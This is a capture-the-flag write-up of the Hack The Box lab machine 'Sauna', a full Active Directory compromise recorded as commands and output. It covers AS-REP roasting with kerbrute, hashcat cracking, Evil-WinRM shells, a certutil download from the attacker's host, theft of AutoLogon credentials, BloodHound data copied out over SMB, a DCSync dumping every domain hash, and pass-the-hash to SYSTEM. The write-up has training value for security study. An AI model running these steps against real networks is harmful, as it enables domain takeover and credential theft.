# Sauna

### Domain

* EGOTISTICAL-BANK.LOCAL (DC)

### Summary

* Obtain the full names of users from the website
* User FSmith is vuln to AS-Rep roasting --> crack password
* Evil-WinRM into Fsmith account to get user.txt
* AutoLogon creds for svc\_loanmgr were present on Fsmith acc
* PrivEsc via secretsdump --> PTH as administrator!

### Nmap

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.175]
└─# nmap -p- --min-rate 5000 -Pn 10.10.10.175 -oN all_ports.nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 20:22 EDT
Nmap scan report for 10.10.10.175
Host is up (0.16s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49689/tcp open  unknown
49696/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.50 seconds

┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.175]
└─# nmap -p 53,80,88,135,139,445,464,593,636,3268,3269,5985,9389 -A --min-rate 5000 -Pn 10.10.10.175 -oN aggr.nmap     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 20:24 EDT
Nmap scan report for 10.10.10.175
Host is up (0.17s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-06 07:24:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-05-06T07:24:58
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   165.78 ms 10.10.14.1
2   165.80 ms 10.10.10.175

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.07 seconds


```

### Port 80

[http://10.10.10.175/about.html](http://10.10.10.175/about.html)

&#x20;Employees

* Fergus Smith
* Shaun Coins
* Sophie Driver
* Bowie Taylor
* Hugo Bear
* Steven Kerb

### Generate list of potential usernames

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.175]
└─# wget https://raw.githubusercontent.com/jseidl/usernamer/master/usernamer.py
--2023-05-05 20:33:05--  https://raw.githubusercontent.com/jseidl/usernamer/master/usernamer.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11130 (11K) [text/plain]
Saving to: ‘usernamer.py’

usernamer.py            100%[============================>]  10.87K  --.-KB/s    in 0.001s  

2023-05-05 20:33:06 (12.8 MB/s) - ‘usernamer.py’ saved [11130/11130]

┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.175]
└─# cat full_names.txt                      
Fergus Smith
Shaun Coins
Sophie Driver
Bowie Taylor
Hugo Bear
Steven Kerb

┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.175]
└─# python2.7 usernamer.py -f full_names.txt > potential_usernames.txt

┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.175]
└─# kerbrute --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL --hash-file hashes.txt --downgrade userenum potential_usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 05/05/23 - Ronnie Flathers @ropnop

2023/05/05 20:55:27 >  Saving any captured hashes to hashes.txt
2023/05/05 20:55:27 >  Using downgraded encryption: arcfour-hmac-md5
2023/05/05 20:55:27 >  Using KDC(s):
2023/05/05 20:55:27 >  	10.10.10.175:88

2023/05/05 20:55:29 >  [+] FSmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:74d687e294741edb75f8170d9ce09242$ea5a0e94b0b44b3df9e3b3604634a1aa1be5c3dac57d1ff69bb9ab85345ef696f7f27f985eed3a9ff29d6242b77b5362e2a199a3fbd9f769499c0e27247bb8c0fc187a9706a7e4eaf99367b72907f0fd820bac80b51959b3b50850dda992684c8cb8680ed58045c8d6699d1fc1d68f64edd05f61a7319684a40c33eebbc6f89fa9435184541f4031fc61bc81b66459bd2db0ccf375e2db9817627dbca80ad81e5f154125b2c8afbcce9c01c3a3b2b39ed25f699b430e6cb83f50ef251ab6bc64451c0daa1910fbf31d28c2a25745a2b323ab79c5d1b637d0090d9366a80f7a7dbda49e0ec012b74d5f961dcc8998311514650f304d3590437ba21b242bcef059
2023/05/05 20:55:29 >  [+] VALID USERNAME:	 FSmith@EGOTISTICAL-BANK.LOCAL
2023/05/05 20:55:38 >  Done! Tested 599 usernames (1 valid) in 10.088 seconds

```

### Cracking the hash

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.175]
└─# cat hashes.txt       
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:74d687e294741edb75f8170d9ce09242$ea5a0e94b0b44b3df9e3b3604634a1aa1be5c3dac57d1ff69bb9ab85345ef696f7f27f985eed3a9ff29d6242b77b5362e2a199a3fbd9f769499c0e27247bb8c0fc187a9706a7e4eaf99367b72907f0fd820bac80b51959b3b50850dda992684c8cb8680ed58045c8d6699d1fc1d68f64edd05f61a7319684a40c33eebbc6f89fa9435184541f4031fc61bc81b66459bd2db0ccf375e2db9817627dbca80ad81e5f154125b2c8afbcce9c01c3a3b2b39ed25f699b430e6cb83f50ef251ab6bc64451c0daa1910fbf31d28c2a25745a2b323ab79c5d1b637d0090d9366a80f7a7dbda49e0ec012b74d5f961dcc8998311514650f304d3590437ba21b242bcef059

D:\chrome_downloads\hashcat-6.2.6>hashcat --identify hash.txt
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol


D:\chrome_downloads\hashcat-6.2.6>hashcat -m 18200 -a 0 hash.txt rockyou.txt
hashcat (v6.2.6) starting

Successfully initialized the NVIDIA main driver CUDA runtime library.

Failed to initialize NVIDIA RTC library.

* Device #1: CUDA SDK Toolkit not installed or incorrectly installed.
             CUDA SDK Toolkit required for proper device support and utilization.
             Falling back to OpenCL runtime.

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
OpenCL API (OpenCL 3.0 CUDA 11.7.101) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #1: NVIDIA GeForce RTX 3050, 7488/8191 MB (2047 MB allocatable), 20MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 175 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:74d687e294741edb75f8170d9ce09242$ea5a0e94b0b44b3df9e3b3604634a1aa1be5c3dac57d1ff69bb9ab85345ef696f7f27f985eed3a9ff29d6242b77b5362e2a199a3fbd9f769499c0e27247bb8c0fc187a9706a7e4eaf99367b72907f0fd820bac80b51959b3b50850dda992684c8cb8680ed58045c8d6699d1fc1d68f64edd05f61a7319684a40c33eebbc6f89fa9435184541f4031fc61bc81b66459bd2db0ccf375e2db9817627dbca80ad81e5f154125b2c8afbcce9c01c3a3b2b39ed25f699b430e6cb83f50ef251ab6bc64451c0daa1910fbf31d28c2a25745a2b323ab79c5d1b637d0090d9366a80f7a7dbda49e0ec012b74d5f961dcc8998311514650f304d3590437ba21b242bcef059:Thestrokes23

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:74d687e...cef059
Time.Started.....: Sat May 06 09:02:14 2023 (1 sec)
Time.Estimated...: Sat May 06 09:02:15 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  8567.0 kH/s (6.04ms) @ Accel:512 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10813440/14344384 (75.38%)
Rejected.........: 0/10813440 (0.00%)
Restore.Point....: 10485760/14344384 (73.10%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: XiaoLing.1215 -> Ms.Jordan
Hardware.Mon.#1..: Temp: 43c Fan:  0% Util: 40% Core: 927MHz Mem:4995MHz Bus:8

Started: Sat May 06 09:02:06 2023
Stopped: Sat May 06 09:02:17 2023


```

### Evil-WinRM as FSmith

```bash
Creds (FSmith:Thestrokes23)

┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.175]
└─# evil-winrm -i 10.10.10.175 -u FSmith                                
Enter Password: 

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
```

### Lateral Movement to svc\_loanmanager

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.175]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.175 - - [05/May/2023 22:15:35] "GET /winpeas64.exe HTTP/1.1" 200 -
10.10.10.175 - - [05/May/2023 22:15:37] "GET /winpeas64.exe HTTP/1.1" 200 -

C:\temp>certutil -urlcache -f http://10.10.14.2/winpeas64.exe winpeas64.exe
certutil -urlcache -f http://10.10.14.2/winpeas64.exe winpeas64.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\temp>winpeas64.exe
winpeas64.exe
ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD

From winpeas64.exe:
          ͹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

C:\temp>net user /domain
net user /domain

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest                    
HSmith                   krbtgt                   svc_loanmgr              
The command completed with one or more errors.


svc_loanmgr:Moneymakestheworldgoround!
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.175]
└─# evil-winrm -i 10.10.10.175 -u svc_loanmgr    
Enter Password: 

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami
egotisticalbank\svc_loanmgr


Get-ObjectAcl -DistinguishedName "dc=egostistical-bank,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}

```

### SharpHound

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.175]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.175 - - [05/May/2023 23:09:17] "GET /SharpHound.exe HTTP/1.1" 200 -

*Evil-WinRM* PS C:\temp> .\SharpHound.exe -c all
2023-05-06T03:10:27.3884011-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2023-05-06T03:10:27.6227780-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-05-06T03:10:27.6540465-07:00|INFORMATION|Initializing SharpHound at 3:10 AM on 5/6/2023
2023-05-06T03:10:51.8883848-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-05-06T03:10:52.0759066-07:00|INFORMATION|Beginning LDAP search for EGOTISTICAL-BANK.LOCAL
2023-05-06T03:10:52.1227812-07:00|INFORMATION|Producer has finished, closing LDAP channel
2023-05-06T03:10:52.1227812-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-05-06T03:11:22.4665441-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2023-05-06T03:11:50.5290146-07:00|INFORMATION|Consumers finished, closing output channel
2023-05-06T03:11:50.5758932-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-05-06T03:11:50.7477682-07:00|INFORMATION|Status: 94 objects finished (+94 1.62069)/s -- Using 42 MB RAM
2023-05-06T03:11:50.7477682-07:00|INFORMATION|Enumeration finished in 00:00:58.6818277
2023-05-06T03:11:50.8727674-07:00|INFORMATION|Saving cache with stats: 53 ID to type mappings.
 53 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-05-06T03:11:50.8885967-07:00|INFORMATION|SharpHound Enumeration Completed at 3:11 AM on 5/6/2023! Happy Graphing!

┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.175]
└─# python3 /usr/local/bin/smbserver.py share . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.175,50226)
[*] AUTHENTICATE_MESSAGE (\,SAUNA)
[*] User SAUNA\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Closing down connection (10.10.10.175,50226)
[*] Remaining connections []

*Evil-WinRM* PS C:\temp> copy 20230506031150_BloodHound.zip \\10.10.14.2\share

```

### Bloodhound

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.175]
└─# neo4j console

┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.175]
└─# bloodhound

Upload Data --> Select the 20230506031150_BloodHound.zip file

Upload completed --> Search "SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL"  --> Node Info --> First Degree Object Control (under Outbound Object Control)

Svc_loanmgr has access to dcsync
```

### Secretsdump

```bash
──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.175]
└─# secretsdump.py -just-dc svc_loanmgr@10.10.10.175 -outputfile dcsync_hashes
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:69d8a7a53b2c7cd332ce99d42c0dc73f:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:5df88a84002c68b921fefc7348c1455930c555da309e823abcd81ab1273501c9
SAUNA$:aes128-cts-hmac-sha1-96:11d908cdc1666f4425dbec19ffc5f63b
SAUNA$:des-cbc-md5:29e6f8f41f1a7323
[*] Cleaning up... 

```

### PTH to Admin

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.175]
└─# impacket-psexec Administrator:@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file qNuOAHSQ.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service vdtD on 10.10.10.175.....
[*] Starting service vdtD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
